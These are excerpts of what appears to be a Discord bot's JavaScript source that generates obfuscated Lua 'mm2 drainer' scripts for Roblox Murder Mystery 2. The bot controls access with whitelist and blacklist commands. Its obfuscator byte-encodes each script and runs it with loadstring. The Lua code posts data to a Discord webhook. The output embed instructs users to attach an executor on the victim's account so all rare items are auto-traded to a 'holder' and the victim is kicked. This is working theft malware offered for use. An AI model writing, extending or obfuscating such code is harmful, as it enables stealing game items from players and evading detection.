...
// ── obfuscator (basic but effective — variable renaming + string encoding) ────
function obfuscate(script) {
  // encode the entire script as a loadstring over base64-like byte array
  const bytes = Buffer.from(script, "utf-8");
  const byteArray = Array.from(bytes).join(",");
  return `local b={${byteArray}}local s=""for i=1,#b do s=s..string.char(b[i])end;loadstring(s)()`;
}
...
local function SendAllEmbeds()
    ...
    pcall(function() RequestFunc({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(MainPayload)}) end)
...
// ── script v2 (placeholder — dj updates this) ─────────────────────────────────
function buildScriptV2(holder, webhook) {
  // same as v1 for now — dj replaces body here
...
// pending generate requests waiting for version pick
...
client.on("messageCreate", async (message) => {
  ...
  if (cmd === "generate") {
    ...
    const pickerEmbed = new EmbedBuilder()
      ...
      .setFooter({ text: "Both versions are obfuscated on output • expires in 60s" })
      .setTimestamp();
  ...
  if (cmd === "whitelist") {
    ...
    if (sub === "add") {
      ...
      return message.reply({ embeds: [successEmbed("✅ Whitelisted", `<@${target.id}> added to whitelist.`)] });
    }
    if (sub === "remove") {
  ...
  if (cmd === "blacklist") {
    ...
    if (sub === "add") {
      ...
      return message.reply({ embeds: [successEmbed("✅ Blacklisted", `<@${target.id}> blacklisted and removed from whitelist.`)] });
    }
    if (sub === "remove") {
...
client.on("interactionCreate", async (interaction) => {
  ...
  if (!data) {
    return interaction.reply({ embeds: [errorEmbed("This picker has expired. Run `!generate` again.")], ephemeral: true });
  }

  if (interaction.user.id !== data.authorId) {
    return interaction.reply({ embeds: [errorEmbed("This isn't your picker.")], ephemeral: true });
  }
  ...
  const embed = new EmbedBuilder()
    ...
    .setDescription(`Your script is ready. Load it into your executor while the **holder is in the same MM2 server**.\n\n> Script is obfuscated — byte-encoded on output.`)
    .addFields(
      { name: "▸ Configuration", value: `\`\`\`\nHolder   : ${holder}\nWebhook  : set\nVersion  : v${version}\nMin Tier : Godly+\n\`\`\``, inline: false },
      { name: "▸ Trade Tiers",   value: "`Godly` `Ancient` `Vintage` `Unique` `Chroma`", inline: false },
      { name: "▸ Steps", value: "1. Have holder join victim's MM2 server\n2. Attach executor on victim's account\n3. Load & execute `.lua` file\n4. Script auto-trades all items → kicks victim", inline: false }
    )
    .setFooter({ text: `mm2 drainer v${version} • obfuscated` })
    .setTimestamp();
